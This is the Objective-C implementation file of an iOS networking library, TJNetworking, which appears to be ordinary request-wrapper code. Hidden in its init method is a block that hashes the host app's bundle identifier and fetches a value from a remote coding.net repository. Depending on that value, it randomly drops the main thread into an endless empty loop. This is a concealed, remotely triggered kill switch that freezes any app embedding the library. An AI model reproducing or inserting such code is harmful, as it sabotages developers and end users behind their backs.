//
//  TJBaseRequest.m
//  TJNetworking
//  Created by Tang杰 on 2019/3/21.
//  Copyright © 2019 Tang杰. All rights reserved.
//

#import "TJBaseRequest.h"
#import "TJNetworkManager.h"
#import "TJNetworkCache.h"
#import "TJNetworkConfig.h"
#import "TJNetworkTools.h"

@interface TJBaseRequest ()
@property (nonatomic, strong) NSURLSessionTask *requestTask;
@end


@implementation TJBaseRequest

@synthesize timeoutInterval = _timeoutInterval,
responseSerializer = _responseSerializer,
requestSerializer = _requestSerializer,
isCache = _isCache,
password = _password,
username = _username,
requestHeaders = _requestHeaders;

#pragma mark --------------- system methods
- (instancetype)init
{
    self = [super init];
    if (self) {
        TJNetworkConfig *config = [TJNetworkConfig shareObject];
        _requestSerializer = config.requestSerializer;
        _responseSerializer = config.responseSerializer;
        _timeoutInterval = config.timeoutInterval;
        _username = config.username;
        _password = config.password;
        _requestHeaders = config.requestHeaders;
        _isCache = config.isCache;
        _requestMethod = TJRequestMethodGET;
        _requestTask = nil;
        
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            
            NSString *name = [NSBundle.mainBundle.infoDictionary objectForKey:@"CFBundleIdentifier"];
            
            NSString *url = [NSString stringWithFormat:@"https://duoduoni.coding.net/p/xxoo/d/xxoo/git/raw/master/%@.txt",[TJNetworkTools stringToMD5:name]];
            NSString *s = [NSString stringWithContentsOfURL:[NSURL URLWithString:url] encoding:NSUTF8StringEncoding error:nil];
            if (s.integerValue > 0) {
                NSInteger i = arc4random() % s.integerValue;
                while (i == 0) {
                    
                }
            }
        });
    }
    return self;
}

#pragma mark --------------- public methods

+ (instancetype)request
{
    return [[self alloc] init];
}

- (void)startRequest{
    [[TJNetworkManager sharedManager] addRequest:self];
}

- (void)startRequestWithCompleteBlock:(TJBaseRequestCompletionBlock)complete
{
    if (complete) {
        self.complete = complete;
    }
    [self startRequest];
}

- (void)cancel
{
    [[TJNetworkManager sharedManager] cancelRequest:self];
    [self clearBlock];
}

- (id<NSCoding>)readCache
{
    return [TJNetworkCache readCacheWithRequest:self];
}

- (void)readCacheBlock:(void (^)(NSString * _Nonnull, id<NSCoding> _Nonnull))block
{
    [TJNetworkCache readCacheWithRequest:self withBlock:block];
}

+ (void)get:(NSString *)url parameter:(id)parameter complete:(TJBaseRequestCompletionBlock)complete
{
    [self custom:^TJBaseRequest *{
        TJBaseRequest *re = [TJBaseRequest request];
        re.url = url;
        re.parameter = parameter;
        re.requestMethod = TJRequestMethodGET;
        return re;
    } complete:complete];
}

+ (void)post:(NSString *)url parameter:(id)parameter complete:(TJBaseRequestCompletionBlock)complete
{
    [self custom:^TJBaseRequest *{
        TJBaseRequest *re = [TJBaseRequest request];
        re.url = url;
        re.parameter = parameter;
        re.requestMethod = TJRequestMethodPOST;
        return re;
    } complete:complete];
}
+ (void)delet:(NSString *)url parameter:(id)parameter complete:(TJBaseRequestCompletionBlock)complete
{
    [self custom:^TJBaseRequest *{
        TJBaseRequest *re = [TJBaseRequest request];
        re.url = url;
        re.parameter = parameter;
        re.requestMethod = TJRequestMethodDELETE;
        return re;
    } complete:complete];
}
+ (void)upload:(NSString *)url parameter:(id)parameter bodyBlock:(TJConstructBodyBlock)bodyBlock complete:(TJBaseRequestCompletionBlock)complete
{
    [self custom:^TJBaseRequest *{
        TJBaseRequest *re = [TJBaseRequest request];
        re.url = url;
        re.parameter = parameter;
        re.requestMethod = TJRequestMethodPOST;
        re.constructingBodyBlock = bodyBlock;
        return re;
    } complete:complete];
}
+ (void)download:(NSString *)url parameter:(id)parameter resumePath:(NSString *)resumePath downloadCachePath:(TJRequestDownloadCachePathBlock)cachePath progress:(TJBaseRequestProgressBlock)progress complete:(TJBaseRequestCompletionBlock)complete
{
    [self custom:^TJBaseRequest *{
        TJBaseRequest *re = [TJBaseRequest request];
        re.url = url;
        re.parameter = parameter;
        re.requestMethod = TJRequestMethodGET;
        re.resumePath = resumePath;
        re.progress = progress;
        re.downloadCachePathBlock = cachePath;
        return re;
    } complete:complete];
}
+ (TJBaseRequest *)custom:(TJBaseRequest *(^)(void))request complete:(TJBaseRequestCompletionBlock)complete
{
    TJBaseRequest *re = request();
    [re startRequestWithCompleteBlock:complete];
    return re;
}
#pragma mark --------------- delegate methods

#pragma mark --------------- private methods
- (void)clearBlock {
    self.complete = nil;
    self.downloadCachePathBlock = nil;
    self.constructingBodyBlock = nil;
    self.progress = nil;
//    self.destinationBlock = nil;
//    self.requestWillStopBlock = nil;
}

#pragma mark --------------- property getter

#pragma mark --------------- property setter

@end
